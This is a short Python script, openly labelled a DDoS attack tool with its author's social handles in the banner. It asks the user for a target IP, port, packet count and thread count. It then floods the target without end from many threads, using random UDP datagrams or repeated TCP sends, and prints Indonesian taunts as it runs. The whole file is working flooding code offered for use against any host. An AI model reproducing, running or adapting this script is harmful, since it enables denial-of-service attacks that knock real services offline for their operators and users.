#!/usr/bin/env python3
#Code by GabrielHanz
import random
import socket
import threading

print("~~~ DDOS BY Mr.GbzHnzz ~~~")
print("~~~ Scripting By GbzHnzz ~~~")
print("~~~ SCRIPT DDOS ATTACK ~~~")\
print("~~~ DISCORD : GbzHnz#3700 ~~~")
print("~~~ YOUTUBE : GbzHnzz ~~~")
ip = str(input(" TARGET (IP):"))
port = int(input(" TAEGET (PORT):"))
choice = str(input(" WITH UDP? (Y/N):"))
times = int(input(" PAKET YANG DIKIRIMKAN:"))
threads = int(input(" THREADS YANG DIKIRIM:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[Bismillah HeadShot!!!]","[Bismillah HeadShot!!!]","[Bismillah HeadShot!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET OTW!!!!, APA GA SENENG? BY PAN8")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[Bismillah HeadShot!!!]","[Bismillah HeadShot!!!]","[Bismillah HeadShot!!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET OTW!!!!, APA GA SENENG? BY PAN")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
